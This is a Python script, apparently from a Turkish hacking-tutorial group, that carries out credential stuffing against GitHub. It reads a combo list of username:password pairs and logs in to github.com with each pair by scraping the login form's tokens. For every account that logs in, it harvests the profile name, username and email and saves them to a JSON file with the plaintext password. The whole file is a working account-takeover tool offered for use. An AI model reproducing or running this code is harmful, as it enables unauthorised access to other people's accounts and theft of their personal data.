# Bu araç @keyiflerolsun tarafından | @KekikAkademi için yazılmıştır.

import argparse
import requests
from bs4 import BeautifulSoup
from progress.bar import ShadyBar
import os, json

class GitChecker(object):
    def __repr__(self) -> str:
        return "Github Account Checker"

    def __init__(self) -> None:
        host    = "github.com"
        origin  = "https://github.com"
        self.referer = "https://github.com/login"

        self.headers = {
            "User-Agent"  : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36",
            "Host"        : host,
            "Origin"      : origin,
            "Referer"     : self.referer,
        }

    def giris_yap(self, posta, sifre, cikti) -> None:
        sess         = requests.session()
        payload_icin = BeautifulSoup(sess.get(self.referer, headers=self.headers).content, "lxml")

        payload = {
            "commit"             : "Sign in",
            "authenticity_token" : payload_icin.find('input', attrs={"name":"authenticity_token"})['value'],
            "login"              : posta,
            "password"           : sifre,
            "timestamp"          : payload_icin.find('input', attrs={"name":"timestamp"})['value'],
            "timestamp_secret"   : payload_icin.find('input', attrs={"name":"timestamp_secret"})['value']
        }

        try:
            sess.post('https://github.com/session', headers=self.headers, data=payload).cookies['user_session']
        except KeyError:
            return None

        profil        = BeautifulSoup(sess.get("https://github.com/settings/profile").content, "lxml")

        adi_soyadi    = profil.find("input", id="user_profile_name")['value']
        kullanici_adi = profil.find("div", class_="f5 text-gray-dark text-bold css-truncate css-truncate-target").text
        e_posta       = profil.find("select", id="user_profile_email").find("option", attrs={'selected' : 'selected'}).text

        self.dict2json({
            "adi_soyadi"    : adi_soyadi,
            "kullanici_adi" : f"@{kullanici_adi}",
            "e_posta"       : e_posta,
            "sifre"         : sifre,
        }, dosya_adi=f"{cikti}.json")

        print(f"""\n\n
        Adı Soyadı    : {adi_soyadi}
        Kullanıcı Adı : @{kullanici_adi}
        e-Posta       : {e_posta}
        Şifre         : {sifre}
        \n""")

    @staticmethod
    def dict2json(sozluk:dict, dosya_adi:str) -> None:
        if os.path.isfile(dosya_adi):
            with open(dosya_adi) as gelen_json:
                gelen_veri = json.load(gelen_json)

            gelen_veri.append(sozluk)

            with open(dosya_adi, mode='w') as f:
                f.write(json.dumps(gelen_veri, indent=2, ensure_ascii=False, sort_keys=False))

        else:
            with open(dosya_adi, mode='w') as f:
                liste = [sozluk]
                essiz = [dict(sozluk) for sozluk in {tuple(liste_ici.items()) for liste_ici in liste}]
                a_z   = sorted(essiz, key=lambda sozluk: sozluk['adi_soyadi'])
                f.write(json.dumps(a_z, indent=2, ensure_ascii=False, sort_keys=False))

    def liste_ver(self, combo_dosya, cikti) -> None:
        if not cikti:
            cikti = "KekikAkademi"

        with open(combo_dosya, 'r+') as combo:
            combo_liste = combo.readlines()

        bar   = ShadyBar('Taranıyor..', max=len(combo_liste))
        for user in combo_liste:
            ayristir = user.rstrip('\n').split(':')
    
            self.giris_yap(ayristir[0], ayristir[1], cikti)
            bar.next()

        bar.finish()

parser = argparse.ArgumentParser()
parser.add_argument("combo", help="Combo 'kullanıcı_adı:şifre' biçiminde kullanıcılar ve şifreler içeren bir listedir.")
parser.add_argument("--cikti", help="Yalnızca dosyanın adı. Uzantı, vermeyin.. (Varsayılan: --cikti KekikAkademi)", action="store_true")

args = parser.parse_args()

if __name__ == "__main__":
    try:
        GitChecker().liste_ver(args.combo, args.cikti)
    except KeyboardInterrupt:
        print("\n\n\tÇıktım Kanka..")
